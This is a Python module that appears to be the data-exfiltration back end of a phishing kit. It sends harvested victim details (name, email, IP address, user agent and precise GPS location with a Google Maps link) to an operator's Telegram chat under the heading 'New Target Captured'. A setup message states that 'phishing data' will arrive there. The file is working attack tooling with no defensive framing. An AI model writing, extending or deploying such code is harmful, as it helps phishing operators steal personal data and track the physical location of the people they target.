import os
import requests
import logging
import json
from dotenv import load_dotenv
import config

# Load environment variables
load_dotenv()

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Telegram configuration
BOT_TOKEN = config.TELEGRAM_BOT_TOKEN
CHAT_ID = config.TELEGRAM_CHAT_ID

# Telegram API URL
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

def send_message(message):
    """Send a text message to Telegram."""
    try:
        url = f"{TELEGRAM_API_URL}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, data=data)
        response.raise_for_status()
        logger.info(f"Message sent to Telegram: {message[:50]}...")
        return response.json()
    except Exception as e:
        logger.error(f"Failed to send message to Telegram: {e}")
        return None

def send_photo(photo_path, caption=None):
    """Send a photo to Telegram."""
    try:
        url = f"{TELEGRAM_API_URL}/sendPhoto"
        
        files = {
            'photo': open(photo_path, 'rb')
        }
        
        data = {
            "chat_id": CHAT_ID
        }
        
        if caption:
            data["caption"] = caption
            
        response = requests.post(url, data=data, files=files)
        response.raise_for_status()
        logger.info(f"Photo sent to Telegram: {photo_path}")
        return response.json()
    except Exception as e:
        logger.error(f"Failed to send photo to Telegram: {e}")
        return None
    
def send_document(file_path, caption=None):
    """Send a document to Telegram."""
    try:
        url = f"{TELEGRAM_API_URL}/sendDocument"
        
        files = {
            'document': open(file_path, 'rb')
        }
        
        data = {
            "chat_id": CHAT_ID
        }
        
        if caption:
            data["caption"] = caption
            
        response = requests.post(url, data=data, files=files)
        response.raise_for_status()
        logger.info(f"Document sent to Telegram: {file_path}")
        return response.json()
    except Exception as e:
        logger.error(f"Failed to send document to Telegram: {e}")
        return None

def send_location(latitude, longitude, caption=None):
    """Send a location to Telegram."""
    try:
        url = f"{TELEGRAM_API_URL}/sendLocation"
        
        data = {
            "chat_id": CHAT_ID,
            "latitude": latitude,
            "longitude": longitude
        }
        
        # If we have a caption, send it as a separate message
        if caption:
            send_message(caption)
            
        response = requests.post(url, data=data)
        response.raise_for_status()
        logger.info(f"Location sent to Telegram: {latitude}, {longitude}")
        return response.json()
    except Exception as e:
        logger.error(f"Failed to send location to Telegram: {e}")
        return None

def send_user_data(user_data):
    """Send user data as a formatted message to Telegram."""
    try:
        # Format the user data into a readable message
        message = "<b>🔴 New Target Captured 🔴</b>\n\n"
        
        # Add user entered info if available
        if 'user_name' in user_data:
            message += f"<b>Name:</b> {user_data['user_name']}\n"
            
        if 'user_email' in user_data:
            message += f"<b>Email:</b> {user_data['user_email']}\n"
        
        if 'ip' in user_data:
            message += f"<b>IP:</b> {user_data['ip']}\n"
        
        if 'timestamp' in user_data:
            message += f"<b>Time:</b> {user_data['timestamp']}\n"
            
        if 'user_agent' in user_data:
            message += f"<b>User Agent:</b> {user_data['user_agent']}\n"
            
        if 'location' in user_data and user_data['location']:
            loc = user_data['location']
            message += f"\n<b>📍 Location:</b>\n"
            if 'latitude' in loc and 'longitude' in loc:
                message += f"<b>Coordinates:</b> {loc['latitude']}, {loc['longitude']}\n"
                message += f"<b>Google Maps:</b> https://www.google.com/maps?q={loc['latitude']},{loc['longitude']}\n"
            if 'accuracy' in loc:
                message += f"<b>Accuracy:</b> {loc['accuracy']} meters\n"
                
        # Send the message
        return send_message(message)
        
    except Exception as e:
        logger.error(f"Failed to send user data to Telegram: {e}")
        return None

# Testing the connection
def test_connection():
    """Test the Telegram bot connection."""
    try:
        url = f"{TELEGRAM_API_URL}/getMe"
        response = requests.get(url)
        response.raise_for_status()
        bot_info = response.json()
        if bot_info["ok"]:
            logger.info(f"Telegram bot connected: {bot_info['result']['username']}")
            send_message("✅ Bot setup successful! Your phishing data will be sent to this chat.")
            return True
        else:
            logger.error(f"Failed to connect to Telegram bot: {bot_info}")
            return False
    except Exception as e:
        logger.error(f"Failed to test Telegram connection: {e}")
        return False

# If this file is run directly, test the connection
if __name__ == "__main__":
    test_connection() 